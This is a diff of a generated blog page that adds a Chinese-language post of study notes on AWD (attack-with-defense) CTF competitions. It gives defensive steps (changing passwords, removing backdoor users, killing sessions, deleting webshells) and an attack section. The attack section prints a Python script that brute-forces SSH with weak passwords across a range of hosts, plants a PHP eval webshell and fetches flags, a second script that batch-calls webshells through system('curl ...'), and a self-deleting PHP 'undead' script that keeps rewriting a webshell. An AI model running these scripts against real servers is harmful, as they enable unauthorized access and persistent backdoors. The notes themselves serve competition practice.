@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2025/2 | 佘雅晴のblog</title>
+  <title>awd | 佘雅晴のblog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="佘雅晴のblog">
-<meta property="og:url" content="http://example.com/archives/2025/02/index.html">
+  <meta name="description" content="AWD基本防守策略1、修改用户密码和服务密码 修改linux密码： #passwd 如果有权限就删除用户 userdel -r [用户名] 如果提权为root cat&#x2F;etc&#x2F;passwd 如果有bash就是这用用户可以登录，没有就不可以，过滤一下cat&#x2F;etc&#x2F;passwd | grep bash 可以删掉有bash的后门用户">
+<meta property="og:type" content="article">
+<meta property="og:title" content="awd">
+<meta property="og:url" content="http://example.com/2025/07/17/awd/index.html">
 <meta property="og:site_name" content="佘雅晴のblog">
+<meta property="og:description" content="AWD基本防守策略1、修改用户密码和服务密码 修改linux密码： #passwd 如果有权限就删除用户 userdel -r [用户名] 如果提权为root cat&#x2F;etc&#x2F;passwd 如果有bash就是这用用户可以登录，没有就不可以，过滤一下cat&#x2F;etc&#x2F;passwd | grep bash 可以删掉有bash的后门用户">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-07-17T09:46:28.000Z">
+<meta property="article:modified_time" content="2025-07-17T08:28:28.806Z">
 <meta property="article:author" content="snake&#39;blog">
 <meta name="twitter:card" content="summary">
   
@@ -207,86 +211,284 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-awd" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2025" class="archive-year">2025</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="archive-article-date">
-        <time datetime="2025-02-12T15:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" target="_blank">文件上传</a>
   
+    <h1 class="article-title" itemprop="name">
+      awd
     </h1>
   
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/08/php/" class="archive-article-date">
-        <time datetime="2025-02-08T04:30:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-08</time>
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2025/07/17/awd/" class="archive-article-date">
+        <time datetime="2025-07-17T09:46:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-07-17</time>
 </a>
 
-        </div>
-    	 
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/08/php/" target="_blank">php</a>
   
-    </h1>
-  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.2k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">5分</span>
+    </span>
+  </span>
+</div>
 
 
-        <div class="article-info info-on-right">
-          
-          
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="基本防守策略"><a href="#基本防守策略" class="headerlink" title="基本防守策略"></a>基本防守策略</h2><h5 id="1、修改用户密码和服务密码"><a href="#1、修改用户密码和服务密码" class="headerlink" title="1、修改用户密码和服务密码"></a>1、修改用户密码和服务密码</h5><ol>
+<li><p>修改linux密码：</p>
+<p><code>#passwd</code></p>
+<p>如果有权限就删除用户</p>
+<p><code>userdel -r [用户名]</code></p>
+<p>如果提权为root</p>
+<p><code>cat/etc/passwd</code></p>
+<p>如果有bash就是这用用户可以登录，没有就不可以，过滤一下<code>cat/etc/passwd | grep bash</code></p>
+<p>可以删掉有bash的后门用户</p>
+</li>
+</ol>
+<span id="more"></span>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+<p>进入mysql：<code>mysql -u root -p</code>然后输入密码（原始为root</p>
+<ol start="2">
+<li><p>修改mysql密码</p>
+<p><code># update mysql.user set password=password(&#39;密码&#39;)where user=&#39;root&#39;;</code></p>
+<p>删除匿名用户：</p>
+<p><code># delete from mysql.user where user=&#39;&#39;;</code></p>
+<p>（先查一下用户表：</p>
+<p><code>select  host,user,password  from   mysql.user</code></p>
+<p>如果user是空的的话就是匿名用户，用上面的语句删掉，删掉记得刷新</p>
+<p>刷新配置：</p>
+<p><code># flush privileges</code></p>
+</li>
+<li><p>修改网站后台密码</p>
+</li>
+</ol>
+<p>   从网站页面或者源码或者御剑工具找到后台页面，然后尝试弱口令登录后修改管理员密码</p>
+<h5 id="2-web防护"><a href="#2-web防护" class="headerlink" title="2.web防护"></a>2.web防护</h5><p>有一个普通用户权限，cd到网站目录下<code># ls</code></p>
+<ol>
+<li><p>将网站的目录打包成tar</p>
+<p><code>#tar-cvf[打包后的文件名.tar][要打包的文件名]</code></p>
+</li>
+<li><p>用ssh或ftp将打包文件拉到本地</p>
+<ol>
+<li><p>ssh：</p>
+<p><code>#scp 用户名@ip地址：要下载的文件路径 存放路径</code></p>
+<p>例：<code>scp root@192.168.16.8:/root/flag.txt/root/</code></p>
+</li>
+<li><p>ftp:</p>
+<p><code># ftp [IP 地址]</code></p>
+<p><code># get [文件名]</code></p>
+<p>或者用ftp登入软件下载</p>
+</li>
+<li><p>用finalshell连接服务器可以看到打包内容，下载</p>
+</li>
+</ol>
+</li>
+<li><p>将压缩包解压，然后拉到D盾里面扫描木马文件</p>
+<p>直接删掉<code>rm filename</code></p>
+</li>
+<li><p>用ssh控制或ftp控制服务器将木马文件删除</p>
+</li>
+</ol>
+<h5 id="3-关闭Shell连接进程"><a href="#3-关闭Shell连接进程" class="headerlink" title="3.关闭Shell连接进程"></a>3.关闭Shell连接进程</h5><ol>
+<li><p>查看正在连接的进程</p>
+<p><code># who</code></p>
+<p>看已经进来的账号，当看到陌生的ip地址登录你的服务器，就要把他踢掉</p>
+</li>
+<li><p>关闭连接进程</p>
+<p><code># pkill -kill -t pts/进程号</code>（进程号是第二列</p>
+</li>
+</ol>
+<h5 id="4-网站守护"><a href="#4-网站守护" class="headerlink" title="4.网站守护"></a>4.网站守护</h5><ol>
+<li><p>查看新增文件，删掉</p>
+<p><code># find ./-cmin -30</code></p>
+<p>（此代码的意思是看30分钟内创建的文件，如果有新创建的文件，大概率是对方在攻击你。<code>./</code>是当前目录下</p>
+</li>
+<li><p>删除不死码</p>
+<p><code># vim killshell.sh</code></p>
+<p><code># chmod 777 killshell.sh</code>(给777权限)</p>
+<p><code># nohup ./killshell.sh &amp;</code>(在后台不断运行脚本)</p>
+<p>kilshell脚本内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while true</span><br><span class="line">	do</span><br><span class="line">		rm-rf xxx.php</span><br><span class="line">	done</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>发现网站页面有漏洞</p>
+<p><code># echo &gt;xxx.php</code>（发现可疑文件直接echo一个空值进去</p>
+</li>
+</ol>
+<p>一般会拿到一个普通用户权限，用这个权限提权到root权限，然后</p>
+<p><code>rm -rf/bin/curl</code>把bin下面的curl给删掉</p>
+<p>因为对面需要<code>curl http://192.168.19.1/flag</code>（curl一个网关，拿下面的flag文件</p>
+<p>回车后会出现flag，当我把bin&#x2F;curl删掉后即使别人入侵我的服务器他也不能通过这种方式拿到flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="基本攻击策略"><a href="#基本攻击策略" class="headerlink" title="基本攻击策略"></a>基本攻击策略</h2><h5 id="1-弱口令攻击"><a href="#1-弱口令攻击" class="headerlink" title="1.弱口令攻击"></a>1.弱口令攻击</h5><p><code>ls/home/</code>看到自己的登录信息，还能看到别人的说明那个人和你一样是普通用户</p>
+<p>上爆破脚本：ssh.py（用python3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		host = <span class="string">&quot;4.4.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.100&quot;</span></span><br><span class="line">		s=paramiko.SSHClient()</span><br><span class="line">		s.set_missing_host_key_policy(AutoAddPolicy())</span><br><span class="line">		s.connect(hostname=host,port=<span class="number">22</span>,username=<span class="string">&#x27;user1&#x27;</span>,password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">		stdin,stdout,stderr=s.exec_command(<span class="string">&#x27;password\n&#x27;</span>);</span><br><span class="line">		stdin.wirte(<span class="string">&quot;123456\nPass@123456\nPass@123456\n&quot;</span>)</span><br><span class="line">		stdin,stdout,stderr=s.exec_command(<span class="string">&quot;echo &#x27;&lt;? php</span></span><br><span class="line"><span class="string">	eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27;&gt;/var/www/html/,xxxx.php&quot;</span>)</span><br><span class="line">		stdin,stdout,stderr=s.exec_command(<span class="string">&#x27;curl http://192.168.19.1/flag&#x27;</span>)</span><br><span class="line">		<span class="built_in">print</span>(host+<span class="string">&#x27;:&#x27;</span>+stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>1,2,3…看你想攻击几台靶机</p>
+<p>修改host和username</p>
+<p>该代码完成几个事：1.通过弱口令登录后修改密码。2.调用shell生成一个webshell到他的网站目录。3.执行curl拿到他的网站信息</p>
+<p><code>vim ssh.py</code>写入脚本,结束<code>wq</code></p>
+<p><code>python3 ssh.py</code>运行</p>
+<h5 id="2-批量调用webshell获取flag"><a href="#2-批量调用webshell获取flag" class="headerlink" title="2.批量调用webshell获取flag"></a>2.批量调用webshell获取flag</h5><p>用D盾扫描自己网站的木马，根据木马写脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		url=<span class="string">&quot;http://4.4.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.100:&quot;</span>+<span class="built_in">str</span>(<span class="number">1005</span>)+<span class="string">&quot;/.xxxx.php&quot;</span>    <span class="comment">#1005是端口</span></span><br><span class="line">		result=requests.post(url,data=&#123;<span class="string">&#x27;cmd&#x27;</span>:<span class="string">&quot;system(&#x27;curl http://192.168.19.1/getkey&#x27;);&quot;</span>&#125;,timeout=<span class="number">2</span>)</span><br><span class="line">		<span class="built_in">print</span>(url+<span class="string">&#x27;--&gt;&#x27;</span>+result.text)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="built_in">print</span>(url+<span class="string">&#x27;--&gt;fails!&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-种植不死马"><a href="#3-种植不死马" class="headerlink" title="3.种植不死马"></a>3.种植不死马</h5><p>将不死马上传网站目录，访问不死马在当前目录生成xxxx.php后门webshell</p>
+<p>php脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#1表示忽略与客户端断开连接，继续执行脚本</span></span><br><span class="line">ignore user <span class="title function_ invoke__">abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">#执行后删除自身</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(_FILE_);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;&lt;?php @eval([&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;xxxx.php&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">500</span>);  <span class="comment">#暂停0.5秒</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个脚本要在目标网站运行，假设已经进入目标网站</p>
+<p><code>vim xxxx.php</code> 写入脚本 <code>wq</code></p>
 
     
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/07/17/awd/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+    <a href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          反序列化
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/07/14/docker/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">docker</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
           </div>
@@ -327,8 +529,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
